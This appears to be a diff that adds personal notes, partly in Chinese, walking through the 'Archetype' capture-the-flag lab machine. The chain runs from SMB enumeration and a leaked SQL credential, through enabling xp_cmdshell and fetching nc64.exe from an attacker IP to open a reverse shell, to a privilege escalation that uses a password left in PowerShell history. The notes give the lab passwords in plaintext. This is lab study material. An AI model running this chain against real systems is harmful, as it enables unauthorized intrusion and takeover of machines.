@@ -1,0 +1,47 @@
+1. nmap -sC -sV -oN archetype.namp 10.129.54.85
+    139  smb
+    1433 mssql
+
+2. smbclient -N -L \\\\10.129.54.85\\
+    -N : No password
+    -L : This option allows you to look at what services are available on a server
+    发现 backups share
+
+3. smbclient -N \\\\10.129.54.85\\backups
+
+4. get prod.dtsConfig
+    User ID=ARCHETYPE\sql_svc
+    Password=M3g4c0rp123
+
+5. python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.54.85 -windows-auth
+    -windows-auth : this flag is specified to use Windows Authentication
+
+6. 获取sql shell后，尝试执行系统命令，EXEC xp_cmdshell;
+    SQL> EXEC xp_cmdshell 'net user';
+    SQL> EXEC sp_configure 'show advanced options', 1;
+    SQL> RECONFIGURE;
+    SQL> EXEC sp_configure 'xp_cmdshell', 1;
+    SQL> RECONFIGURE;
+    SQL>
+    SQL> xp_cmdshell "whoami"
+    SQL>
+
+7. 上一次执行单次命令，这一步尝试获取reverse shell；
+    本地10.10.14.9存放文件： nc64.exe
+    SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"
+
+    本地10.10.14.9监听443端口，nc -lvnp 443获取shell
+    SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"
+
+8. windows提权，winPEAS工具
+    powershell wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
+    powershell wget http://10.10.16.10/winPEASx64.exe -outfile winPEASx64.exe
+    PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
+
+9. 获取admin密码  C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+    /user:administrator MEGACORP_4dm1n!!
+
+
+10. python3 psexec.py administrator@10.129.54.85
+    得到system权限
+    C:\Users\Administrator\Desktop> type root.txt
